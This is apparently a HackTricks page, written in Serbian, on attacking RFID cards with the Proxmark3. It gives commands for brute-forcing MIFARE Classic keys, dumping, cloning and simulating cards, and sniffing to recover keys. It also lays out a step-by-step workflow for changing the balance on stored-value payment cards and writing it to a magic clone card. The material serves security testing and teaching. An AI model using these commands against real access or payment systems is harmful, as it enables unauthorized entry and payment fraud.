# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Napad na RFID sisteme pomoću Proxmark3

Instalirajte aktivno održavani RRG/Iceman Proxmark3 client i odgovarajući firmware, a zatim potvrdite sintaksu komandi u toj verziji, jer su starije komande prikazane u nastavku možda promenjene.<sup>[[1]](#references)[[5]](#references)</sup>

### Napad na MIFARE Classic 1KB

MIFARE Classic 1K ima **16 sektora**, a svaki ima **4 bloka** od po **16 bajtova**. Blok proizvođača 0 sadrži UID/podatke proizvođača i na originalnim NXP karticama je read-only; posebne clone ili „magic“ kartice mogu dozvoliti njegovo prepisivanje.<sup>[[1]](#references)[[2]](#references)</sup>\
Za pristup svakom sektoru potrebna su vam **2 ključa** (**A** i **B**), koji su sačuvani u **bloku 3 svakog sektora** (sector trailer). Sector trailer takođe čuva **access bits** koji određuju **read i write** dozvole za **svaki blok** pomoću 2 ključa.\
2 ključa su korisna za dodelu read dozvola ako znate prvi ključ, a write dozvola ako znate drugi ključ (na primer).

Može se izvesti nekoliko napada.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 omogućava izvođenje drugih radnji, kao što je **eavesdropping** **Tag to Reader komunikacije**, kako bi se pokušali pronaći osetljivi podaci. Na ovoj kartici možete jednostavno sniffovati komunikaciju i izračunati korišćeni ključ jer su **kriptografske operacije koje se koriste slabe**, a poznavanjem plain i cipher teksta možete da ga izračunate (`mfkey64` alat).<sup>[[3]](#references)</sup>

#### Brzi workflow za zloupotrebu sačuvane vrednosti na MiFare Classic karticama

Kada terminali čuvaju stanje na Classic karticama, tipičan end-to-end tok je:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Beleške

- `hf mf autopwn` orchestrira nested/darkside/HardNested-style napade, oporavlja ključeve i kreira dump-ove u dumps folderu klijenta.<sup>[[1]](#references)</sup>
- Upisivanje bloka 0/UID-a funkcioniše samo na magic gen1a/gen2 karticama. Normalne Classic kartice imaju UID samo za čitanje.<sup>[[2]](#references)</sup>
- Mnoge implementacije koriste Classic „value blocks“ ili jednostavne kontrolne zbirove. Uverite se da su sva duplicirana/komplementirana polja i kontrolni zbirovi konzistentni nakon izmene.<sup>[[4]](#references)</sup>

Pogledajte metodologiju višeg nivoa i mere za ublažavanje rizika u:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Sirove komande

IoT sistemi ponekad koriste **nebrendirane ili nekomercijalne tagove**. U tom slučaju možete koristiti Proxmark3 za slanje prilagođenih **sirovih komandi tagovima**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
Sa ovim informacijama mogli biste pokušati da pronađete informacije o kartici i načinu komunikacije sa njom. Proxmark3 omogućava slanje raw komandi kao što je: `hf 14a raw -p -b 7 26`

### Skripte

Proxmark3 software dolazi sa unapred učitanom listom **skripti za automatizaciju** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili kompletnu listu, koristite komandu `script list`. Zatim koristite komandu `script run`, nakon koje sledi ime skripte:
```
proxmark3> script run mfkeys
```
Možete napraviti skriptu za **fuzzovanje čitača tagova**, tako što ćete kopirati podatke **važeće kartice**, napisati **Lua skriptu** koja **nasumično menja** jedan ili više **nasumičnih bajtova** i proveriti da li se **čitač ruši** u nekoj iteraciji.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP izjava o MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Eksploatacija ranjivosti NFC kartice u KioSoft Stored Value sistemu (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux instalacija](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
